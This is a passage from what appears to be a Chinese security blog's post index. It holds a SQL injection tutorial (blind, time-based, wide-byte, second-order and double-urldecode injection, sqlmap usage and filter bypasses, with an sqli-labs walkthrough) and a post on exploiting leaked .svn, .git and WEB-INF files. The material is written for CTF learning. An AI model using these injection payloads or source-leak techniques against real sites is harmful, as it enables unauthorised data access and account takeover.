=1' and length(database())><=N --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜测数据库名字。</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id =1' and ascii(substr(database(),1,1))><=N --+        （利用二分法，ascii为ascii码，例如97=‘a’）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符</p><p>所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3…到最后一个字符。</p><p>SUBSTR(str,pos): pos开始的位置，一直截取到最后 </p></blockquote><p>6、猜表名</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))><=N --+）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 7、猜列名：</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))><=N --+ (如果报错可以加limit 0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 8、查字段</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+然后重复以上猜解字符串手法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果有黑名单机制，可用<code>mid()</code>代替<code>substr()</code>，括号代替空格。</p><p><strong>小trick</strong></p><p>当and或者or等被禁时，可以用尝试用运算符代替。字符串和数字进行比较或者位运算时会被当作 <strong>0</strong>。</p><p><img src="/img/image-20210401114906211.png" alt="image-20210401114906211"></p><p>这张图简单验证了这一点。</p><p><strong>实际上，一般还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p><p> SQLMAP目前支持的注入方式包括（默认全进行）：</p><blockquote><p>  B: Boolean-based blind SQL injection（布尔型注入）</p><p>  E: Error-based SQL injection（报错型注入）</p><p>  U: UNION query SQL injection（可联合查询注入）</p><p>  S: Stacked queries SQL injection（可多语句查询注入）</p><p>  T: Time-based blind SQL injection（基于时间延迟注入）</p><p>  Q: Inline SQL Injection (内联注入)</p></blockquote><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果</p><p>判断：</p><pre><code>?id=1’ and sleep(5)        // 响应时间比正常情况多5秒，则存在延时注入</code></pre><p>查数据库</p><pre><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)</code></pre><p>其他操作方式与布尔型类似。<br>例如：<br>尝试延时注入</p><pre><code>?id=1’ and sleep(5) --+     //第一步,判断是否有延时注入?id=1' and if(length(database())&gt;&lt;=N,sleep(5),0) --+        //第二步，猜测数据库名长度?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0) --+     //第三步猜测数据库名</code></pre><p><strong>手工注入是不可能手工注入的，还是sqlmap省事</strong>，加参数 –technique=T，时间注入一步到位。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>GBK编码每个字符占两字节（bytes）</p><p>ASCII编码每个字符占一字节</p><p><strong>重点：注入原理</strong></p><p><strong>PHP中使用的编码方式为GBK，</strong></p><p><strong>函数执行（参数等）使用的是ASCII编码；</strong></p><p><strong>而MYSQL使用的默认字符集是GBK等宽字节字符集。</strong></p><p>当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。</p><p>当源码中设置”set character_set_client=gbk”  时</p><p>%df%27 可把程序中转义函数过滤的“\ ” （%5c）吃掉。</p><blockquote><p>如addslashes()函数会在用户输入的单引号 ‘ （%27）前面加一个反斜杠 \ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”</p></blockquote><p>例如：</p><p><code>/1.php?id=1</code>存在宽字节注入时，则: <code>/1.php?id=-1’and 1=1%23</code>,-1后面的单引号会被转义成  \’</p><p>但是提交：</p><pre><code> /1.php?id=-1%df’and 1=1%23</code></pre><p> 时，</p><p><code>%df</code>和 反斜杠 \ (%5c) 组合 <code>%df%5c</code>  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。</p><p>例如：如果有某网站的后台登录SQL语句是这样的</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM users WHERE username='$username' and password='$password'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果，我们先注册一个用户，用户名为”admin’ – “，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM users WHERE username='admin' -- ' and password='$password'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，就直接登录了<strong>admin</strong>账户，如果admin账户存在的话。这就是二次注入的基本原理。</p><p>可以抽象概括为两步：</p><p>1.插入恶意数据</p><p>2.引用恶意数据</p><p><strong>应用场景</strong></p><p>Web应用程序常使用</p><p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p><p>或者开启GPC（<code>magic_quote_gpc=on</code>,<strong><em>开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能</em></strong>）</p><p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p><p>二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了</p><p>比如：</p><p><code>admin' --</code>这个输入，直接传入后台经过addslashes()函数过滤后，就变成了<code>admin\' --</code>，这个嵌入sql语句是没用的，无法闭合sql语句。</p><pre><code>UPDATE users SET PASSWORD='$pass' where username='admin\' -- ' and password='$curr_pass'</code></pre><p>但是如果把它作为一个账户名注册入数据库，它在数据库里就是<code>admin' --</code>。这时我们先以这个<code>admin' --</code>账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是<code>admin' --</code>，也是说，后台sql语句是</p><pre class="line-numbers language-mysql"><code class="language-mysql">UPDATE users SET PASSWORD='$pass' where username='admin' -- ' and password='$curr_pass'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>--</code>后面的语句被注释，也就是说，我们修改的是admin账户的密码。</p><p><strong>sqli-labs实例分析</strong></p><p><strong>less-24</strong></p><p><img src="/img/image-20210122114946180.png" alt="image-20210122114946180"></p><p>一个登录界面，有创建新用户，也有忘记密码。</p><p>登录的后端源码是这样的</p><p><img src="/img/image-20210122123420557.png" alt="image-20210122123420557"></p><p>用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的</p><p>我们先看看数据库中有哪些用户名</p><p><img src="/img/image-20210122115233156.png" alt="image-20210122115233156"></p><p>sqli的数据库是security,users表中有以上用户名和密码</p><p>那么我们构建一个<code>admin' -- -</code>用户，新建一下</p><p>看一下创建新用户的源码</p><p><img src="/img/image-20210122115619387.png" alt="image-20210122115619387"></p><p>可以看到三个输入都是用mysql_escape_string()函数过滤了的</p><p>然而</p><p><img src="/img/image-20210122124433626.png" alt="image-20210122124433626"></p><p>存储到数据库中的数据就是原始数据，我们可以看到表中多了一行<code>admin' -- -</code>用户的数据</p><p>现在以这个用户的身份登录</p><p><img src="/img/image-20210122125026004.png" alt="image-20210122125026004"></p><p>这里我们可以看到，它的界面上显示的用户名是<code>admin' -- -</code>，没有转义符号反斜杠<code>\</code>，为什么呢？我们看看源码</p><p><img src="/img/image-20210122130743856.png" alt="image-20210122130743856"></p><p>它输出的是session中的”username”</p><p>session中的“username”是哪来的呢？在login.php里面</p><p><img src="/img/image-20210122131034335.png" alt="login.php"></p><p>这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[“username”]，所以session中的username是从数据库中读取的，未经过安全函数过滤。</p><p>然后我们来修改密码</p><p><img src="/img/image-20210122131804080.png" alt="pass-change.php"></p><p>以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是</p><pre class="line-numbers language-mysql"><code class="language-mysql">UPDATE users SET PASSWORD='$pass' where username='admin' -- -' and password='$curr_pass' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>admin</code>用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是<code>admin</code>用户</p><p>把密码改成<code>12345</code></p><p><img src="/img/image-20210122132251979.png" alt="修改成功"></p><p>再来看看数据库</p><p><img src="/img/image-20210122132407600.png" alt="admin的密码变成了12345"></p><p>第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了</p><p><strong>二次urldecode 注入</strong></p><p>Web应用程序通常使用</p><p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p><p>或者开启GPC（<code>magic_quote_gpc=on</code>,<em>开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能</em>）</p><p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p><p>如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。</p><p><strong>原理：</strong></p><p>由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数</p><pre><code>id=1%2527</code></pre><p>经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27</p><p>第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为</p><pre><code>id=1'</code></pre><p>这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。</p><p>这个的原理类似于上面的宽字节注入</p><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><h3 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h3><p>后台SQL语句中使用了HTTP头中的<code>User-agent</code>字段中的数据</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --user-agent "UA" --dbs --level 3</code></pre><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>后台SQL语句中使用了HTTP头中<code>Cookie</code>字段中的数据</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --cookie "[cookie名]=[内容]" --dbs --level 2</code></pre><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>后台SQL语句中使用了HTTP头中的<code>Refer</code>字段中的数据</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level 5</code></pre><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>后台SQL语句中使用了HTTP头中的<code>host</code>字段中的数据</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level 5</code></pre><p>以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决</p><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>上面的http头注入其实就是一种稍微特殊的post注入，<strong>post注入</strong>，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。</p><p>利用sqlmap进行post注入有几种方式</p><p><strong>1.普通的表单注入</strong></p><p>在表单中，例如登陆页面，如果不知道哪个参数存在注入点，可以直接添加<code>--forms</code>命令参数</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --forms --batch</code></pre><p><strong>2.带参数的表单注入</strong></p><p>如果已知某个参数有注入漏洞，如”id=1&amp;time=2001”</p><pre><code>sqlmap &gt; py sqlmap.py -u “url” --data “id=1&amp;time=2001” --batch</code></pre><p><strong>3.使用文件指定参数的表单（HTTP头）注入</strong></p><p>比如已知注入点为id，在post表单中</p><p>用Burpsuite抓包，把报头保存为<code>post.txt</code>，放在sqlmap同目录下（或者随便放哪，到时候带路径就行，懂得都懂）</p><pre><code>sqlmap &gt; py sqlmap.py -r post.txt -p id --dbs --batch     //用-p参数指定注入点或者sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别，level 3级别就会自动探测http头</code></pre><p>要在http头中进行注入，只要在需要探测的字段后面添加一个<code>*</code>号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个<code>*</code>号。</p><pre><code>Referer: http://127.0.0.1/sqli/Less-19/*</code></pre><p><strong>4.使用Burpsuite带sqlmap插件注入</strong></p><p>很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。</p><h2 id="GET报错注入"><a href="#GET报错注入" class="headerlink" title="GET报错注入"></a>GET报错注入</h2><h1 id="MySQL的SQL预处理-Prepared"><a href="#MySQL的SQL预处理-Prepared" class="headerlink" title="MySQL的SQL预处理(Prepared)"></a><a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">MySQL的SQL预处理(Prepared)</a></h1><blockquote><p>一、SQL 语句的执行处理<br>1、即时 SQL<br>　　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：<br>　　1. 词法和语义解析；<br>　　2. 优化 SQL 语句，制定执行计划；<br>　　3. 执行并返回结果；<br>　　如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。<br>2、预处理 SQL<br>　　但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符（即?）替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p></blockquote><p>MySQL 官方将 <code>prepare</code>、<code>execute</code>、<code>deallocate</code> 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p><p>语法：</p><pre class="line-numbers language-mysql"><code class="language-mysql"># 定义预处理语句PREPARE stmt_name FROM preparable_stmt;     # stmt_name是预处理语句的名字，preparable_stmt是sql语句# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];    # mysql的变量前加@标识# 删除(释放)定义{DEALLOCATE | DROP} PREPARE stmt_name;    # deallocate或者drop都可以用来删除预处理语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>预处理 SQL 使用注意点</strong><br>1、stmt_name 作为 preparable_stmt 的接收者，<strong>唯一标识，不区分大小写</strong>。<br>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。<br>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。<br>4、<strong>PREPARE stmt_name 的作用域是session级</strong><br>5、要用变量替换标识符时，字符串变量中的标识符部分要用反引号包起来，不然会当成字符常量。</p><h1 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a>SQL注入绕过技巧</h1><h2 id="绕过逗号过滤"><a href="#绕过逗号过滤" class="headerlink" title="绕过逗号过滤"></a>绕过逗号过滤</h2><p><strong>join绕过</strong></p><p>简单的几句，在显示位上替换为常见的注入变量或其它语句：</p><pre class="line-numbers language-mysql"><code class="language-mysql">union select 1,2,3,4;union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);//将4替换成你想要查询的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>mid()</code>函数和<code>substr()</code>一样，一种写法是<code>mid(xxx,1,1)</code>，另一种是<code>mid(xxx,from 1 for 1)</code>但是如果过滤了for和逗号，那么怎么办呢？<br><code>ascii()</code>是取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。</p><p>这样在过滤了逗号时，就能够使用mid()代替substr()绕过了。</p><h1 id="常用数据库变量："><a href="#常用数据库变量：" class="headerlink" title="常用数据库变量："></a>常用数据库变量：</h1><pre><code>User() 查看用户database()     --查看数据库名称Version()     --查看数据库版本@@datadir     --数据库路径@@version_compile_os    --操作系统版本system_user()     --系统用户名current_user()    --当前用户名session_user()    --连接数据库的用户名</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>版本控制系统信息泄露分析</title>
      <link href="/2021/01/14/2021-1-14-ban-ben-kong-zhi-xi-tong-xin-xi-xie-lu-fen-xi/"/>
      <url>/2021/01/14/2021-1-14-ban-ben-kong-zhi-xi-tong-xin-xi-xie-lu-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="版本控制系统信息泄露分析"><a href="#版本控制系统信息泄露分析" class="headerlink" title="版本控制系统信息泄露分析"></a>版本控制系统信息泄露分析</h1><h2 id="svn文件"><a href="#svn文件" class="headerlink" title=".svn文件"></a>.svn文件</h2><p>.svn文件是 Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。</p><p>黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p><p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p><p><strong>系统中没有Subversion的情况下：</strong>手工查找。</p><p>多半是去寻找项目的源代码，那么就去寻找<strong>以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）</strong>，或者也可以先读一读entries文件，直接用记事本打开就行，如果方法得当，就能节省不少时间。</p><p><strong>系统中有Subversion的情况下：</strong>先用命令查找一遍</p><ul><li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li><li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li><li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li><li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li></ul><hr><h3 id="1、svn-log"><a href="#1、svn-log" class="headerlink" title="1、svn log"></a>1、svn log</h3><p>可以显示所有的信息，如果只希望查看特定的某两个版本之间的信息，可以使用：</p><pre><code>root@runoob:~/svn/runoob01/trunk# svn log -r 6:8------------------------------------------------------------------------r6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 linechange HelloWorld.html first.------------------------------------------------------------------------r7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 linechange HelloWorld.html second------------------------------------------------------------------------r8 | user01 | 2016-11-07 02:53:13 +0800 (Mon, 07 Nov 2016) | 1 lineSVN readme.------------------------------------------------------------------------</code></pre><p>如果只想查看某一个文件的版本修改信息，可以使用 <strong>svn log</strong> 文件路径。</p><pre><code>root@runoob:~/svn/runoob01# svn log trunk/HelloWorld.html ------------------------------------------------------------------------r7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 linechange HelloWorld.html second------------------------------------------------------------------------r6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 linechange HelloWorld.html first.------------------------------------------------------------------------r5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line------------------------------------------------------------------------r4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 lineAdd function to accept input and to display array contents------------------------------------------------------------------------r3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line------------------------------------------------------------------------r2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 linefirst file------------------------------------------------------------------------</code></pre><p>如果希望得到目录的信息要加 <strong>-v</strong>。</p><p>如果希望显示限定N条记录的目录信息，使用 <code>svn log -l N -v</code>。</p><pre><code>root@runoob:~/svn/runoob01/trunk# svn log -l 5 -v ------------------------------------------------------------------------r6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 lineChanged paths:   M /trunk/HelloWorld.htmlchange HelloWorld.html first.------------------------------------------------------------------------r5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 lineChanged paths:   M /trunk/HelloWorld.html------------------------------------------------------------------------r4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 lineChanged paths:   M /trunk/HelloWorld.htmlAdd function to accept input and to display array contents------------------------------------------------------------------------r3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 lineChanged paths:   A /trunk/HelloWorld.html (from /trunk/helloworld.html:2)   D /trunk/helloworld.html------------------------------------------------------------------------r2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 lineChanged paths:   A /trunk/helloworld.htmlfirst file------------------------------------------------------------------------</code></pre><hr><h3 id="2、svn-diff"><a href="#2、svn-diff" class="headerlink" title="2、svn diff"></a>2、svn diff</h3><p>用来检查历史修改的详情。</p><ul><li>检查本地修改</li><li>比较工作拷贝与版本库</li><li>比较版本库与版本库</li></ul><p><strong>（1）、如果用 svn diff，不带任何参数，它将会比较你的工作文件与缓存在 .svn 的”原始”拷贝。</strong></p><pre><code>root@runoob:~/svn/runoob01/trunk# svn diffIndex: rules.txt===================================================================--- rules.txt (revision 3)+++ rules.txt (working copy)@@ -1,4 +1,5 @@Be kind to othersFreedom = ResponsibilityEverything in moderation-Chew with your mouth open</code></pre><p><strong>（2）、比较工作拷贝和版本库</strong></p><p>比较你的工作拷贝和版本库中版本号为 3 的文件 rule.txt。</p><pre><code>svn diff -r 3 rule.txt</code></pre><p><strong>（3）、比较版本库与版本库</strong></p><p>通过 -r(revision) 传递两个通过冒号分开的版本号，这两个版本会进行比较。</p><p>比较 svn 工作版本中版本号2和3的这个文件的变化。</p><pre><code>svn diff -r 2:3 rule.txt</code></pre><hr><h3 id="3、svn-cat"><a href="#3、svn-cat" class="headerlink" title="3、svn cat"></a>3、svn cat</h3><p>如果只是希望检查一个过去版本，不希望查看他们的区别，可使用svn cat</p><pre><code>svn cat -r 版本号 rule.txt</code></pre><p>这个命令会显示在该版本号下的该文件内容</p><hr><h3 id="4、svn-list"><a href="#4、svn-list" class="headerlink" title="4、svn list"></a>4、svn list</h3><p>s<strong>vn list</strong> 可以在不下载文件到本地目录的情况下来察看目录中的文件：</p><pre><code>$ svn list http://192.168.0.1/runoob01READMEbranches/clients/tags/</code></pre><h3 id="SVN-版本回退"><a href="#SVN-版本回退" class="headerlink" title="SVN 版本回退"></a>SVN 版本回退</h3><hr><p>当我们想放弃对文件的修改，可以使用 <strong>SVN revert</strong> 命令。</p><p>svn revert 操作将撤销任何文件或目录里的局部更改。</p><p>我们对文件 readme 进行修改,查看文件状态。</p><pre><code>root@runoob:~/svn/runoob01/trunk# svn statusM       readme</code></pre><p>这时我们发现修改错误，要撤销修改，通过 svn revert 文件 readme 回归到未修改状态。</p><pre><code>root@runoob:~/svn/runoob01/trunk# svn revert readme Reverted 'readme'</code></pre><p>再查看状态。</p><pre><code>root@runoob:~/svn/runoob01/trunk# svn status root@runoob:~/svn/runoob01/trunk# </code></pre><p>进行 revert 操作之后，readme 文件恢复了原始的状态。 revert 操作不单单可以使单个文件恢复原状， 而且可以使整个目录恢复原状。恢复目录用 -R 命令，如下。</p><pre><code>svn revert -R trunk</code></pre><p>但是，假如我们想恢复一个已经提交的版本怎么办。</p><p>为了消除一个旧版本，我们必须撤销旧版本里的所有更改然后提交一个新版本。这种操作叫做 reverse merge。</p><p>首先，找到仓库的当前版本，现在是版本 22，我们要撤销回到之前的版本，比如版本 21。</p><pre><code>svn merge -r 22:21 readme </code></pre><h2 id="git文件"><a href="#git文件" class="headerlink" title=".git文件"></a>.git文件</h2><p>Git泄露上一篇博客将得挺清楚了，一般ctf中会遇到的问题都有了，如果将来写题遇到什么有趣的、有用的东西再记录一下，这里贴一些git常用命令吧，也是实用的东西。</p><p><strong>创建分支命令：</strong></p><pre><code>git branch (branchname)            //创建一个叫branchname的分支</code></pre><p><strong>列出分支命令：</strong></p><pre><code>git branch</code></pre><p>没有参数时，<code>git branch</code> 会列出你在本地的分支。</p><pre><code>$ git branch* master</code></pre><p>此例的意思就是，我们有一个叫做 <strong>master</strong> 的分支，并且该分支是当前分支。</p><p>当你执行 <strong>git init</strong> 的时候，默认情况下 Git 就会为你创建 <strong>master</strong> 分支。</p><p><strong>切换分支命令:</strong></p><pre><code>git checkout (branchname)</code></pre><p>当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。</p><p>上一篇提到了一个<code>git checkout-index</code>命令，就是将index索引中的文件”切换“出来，切换到当前工作目录。</p><p><strong>合并分支命令:</strong></p><pre><code>git merge </code></pre><p>一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> branch* master  newtest$ <span class="token function">ls</span>README        test.txt$ <span class="token function">git</span> merge newtestUpdating 3e92c19<span class="token punctuation">..</span>c1501a2Fast-forward xxx.php <span class="token operator">|</span> 0 test.txt   <span class="token operator">|</span> 1 - 2 files changed, 1 deletion<span class="token punctuation">(</span>-<span class="token punctuation">)</span> create mode 100644 xxx.php delete mode 100644 test.txt$ <span class="token function">ls</span>README        xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上实例中我们将 newtest 分支合并到主分支去，test.txt 文件被删除。</p><p>合并完后就可以删除分支:</p><p><strong>删除分支命令：</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> branch -d <span class="token punctuation">(</span>branchname<span class="token punctuation">)</span>        //删除名为branchname的分支<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>$ git branch -d newtestDeleted branch newtest (was c1501a2).</code></pre><p>删除后， 就只剩下 master 分支了：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> branch* master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="WEB-INF-web-xml"><a href="#WEB-INF-web-xml" class="headerlink" title="WEB-INF/web.xml"></a>WEB-INF/web.xml</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p><pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。   /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中     /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。  /WEB-INF/database.properties：数据库配置文件</code></pre><p>漏洞成因：</p><p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>但是具体情况具体分析，实际场景下还是要尽量发挥随机应变的能力。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
